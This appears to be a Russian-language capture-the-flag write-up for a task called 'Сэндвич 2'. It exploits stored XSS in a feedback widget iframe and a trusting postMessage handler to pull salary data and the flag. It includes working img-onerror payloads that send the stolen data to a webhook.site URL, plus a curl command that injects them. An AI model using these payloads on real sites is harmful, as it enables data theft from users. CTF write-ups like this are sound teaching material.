# Сэндвич 2

**Автор:** `@fakedesyncc`

Расшифровка текста: Trust no iframe, even your own — подсказка в самом флаге.

---

## Суть уязвимости

1. На сайте sandwich.duckerz.ru есть виджет обратной связи — iframe с feedback.duckerz.ru/widget.
2. Родительская страница (sandwich) и виджет (iframe) общаются через postMessage.
3. Виджет может отправить родителю сообщение { type: 'REQUEST_SALARY_DATA' }, и родитель отвечает сообщением { type: 'SALARY_DATA', payload: ... } с данными зарплаты (и флагом).
4. В виджете можно выполнить свой код (XSS), если удаётся вставить его в контент, который там рендерится. Один из способов — отправить Complaint (жалобу) через API feedback с HTML/JS в поле message. Когда эта жалоба отображается в контексте виджета, выполняется наш скрипт.
5. Скрипт: подписаться на message, отправить родителю REQUEST_SALARY_DATA, в ответ принять SALARY_DATA и отправить payload на свой webhook.

---

## Шаги решения

### 1. Создать webhook

- Зайти на https://webhook.site и скопировать свой уникальный URL (или создать токен).

### 2. Подготовить XSS-пейлоад

Код должен выполняться внутри iframe виджета (origin feedback.duckerz.ru):

- Слушать событие message.
- Если e.data.type === 'SALARY_DATA' — отправить e.data.payload на webhook.
- Отправить родителю parent.postMessage({ type: 'REQUEST_SALARY_DATA' }, '*'), чтобы запросить данные.

Пример (подставить свой WEBHOOK):
```html
<img src=x onerror="
  window.addEventListener('message', function(e) {
    if (e.data.type === 'SALARY_DATA') {
      fetch('https://WEBHOOK.site/ТВОЙ-UUID?flag=' + encodeURIComponent(JSON.stringify(e.data.payload)));
    }
  });
  parent.postMessage({ type: 'REQUEST_SALARY_DATA' }, '*');
">
```

Однострочник для отправки через API:
```html
<img src=x onerror="window.addEventListener('message',function(e){if(e.data.type==='SALARY_DATA')fetch('https://WEBHOOK?flag='+encodeURIComponent(JSON.stringify(e.data.payload)))});parent.postMessage({type:'REQUEST_SALARY_DATA'},'*');">
```

### 3. Отправить пейлоад в обратную связь (не в note перевода)

- Эндпоинт: POST http://feedback.duckerz.ru/api/feedback
- Тело (JSON): 
```json
{"category":"complaint","rating":1,"message":"<твой HTML с img onerror>"}
```

Важно: отправлять именно в обратную связь (Complaint/Bug Report), чтобы сообщение
отображалось в виджете (iframe). В note перевода контент показывается на дашборде 
sandwich (родитель), а ответ с salary приходит в iframe — перехватить там из note 
нельзя.

### 4. Дождаться выполнения

Когда жалоба будет открыта в интерфейсе, где контент рендерится внутри виджета 
(iframe feedback), выполнится наш скрипт: уйдёт запрос к родителю, придёт 
SALARY_DATA, данные уйдут на webhook.

### 5. Забрать флаг с webhook

В запросе к webhook в параметре flag (или в теле) будет JSON с payload. В нём — флаг

---

## Пример через curl
```bash
WEBHOOK="https://webhook.site/ТВОЙ-UUID"
PAYLOAD='<img src=x onerror="window.addEventListener(\'message\',function(e){if(e.data.type===\'SALARY_DATA\')fetch(\''"$WEBHOOK"'?flag=\'+encodeURIComponent(JSON.stringify(e.data.payload)))});parent.postMessage({type:\'REQUEST_SALARY_DATA\'},\'*\');">'
curl -X POST "http://feedback.duckerz.ru/api/feedback" \
  -H "Content-Type: application/json" \
  -d '{"category":"complaint","rating":1,"message":"'"$PAYLOAD"'"}'
```